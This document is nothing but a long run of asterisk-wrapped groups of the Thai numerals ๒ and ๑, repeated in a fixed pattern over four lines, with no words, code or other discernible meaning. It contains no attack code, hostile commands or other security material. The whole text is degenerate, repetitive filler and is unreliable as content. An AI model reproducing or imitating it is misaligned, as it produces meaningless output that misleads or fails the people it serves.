*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑* 